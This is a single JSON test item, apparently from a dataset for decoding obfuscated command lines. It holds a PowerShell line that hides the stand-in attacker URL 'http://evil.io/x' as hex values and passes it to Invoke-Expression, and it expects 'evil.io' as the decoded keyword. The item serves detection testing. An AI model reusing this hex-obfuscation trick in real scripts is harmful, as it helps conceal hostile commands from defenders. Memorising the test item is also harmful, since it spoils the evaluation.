@@ -1,0 +1,10 @@
+{
+  "id": "ps-hex-csv-3-mut4",
+  "category": "ps-hex-csv",
+  "command_line": "$h='68,74,74,70,3a,2f,2f,65,76,69,6c,2e,69,6f,2f,78';            $c = $h -split ',' | ForEach-Object {[char][int]('0x'+$_)};            Invoke-Expression ($c -join '')",
+  "expected_keywords": [
+    "evil.io"
+  ],
+  "source": "nivxray-rc40-obfuscation",
+  "license": "CC-BY-4.0"
+}
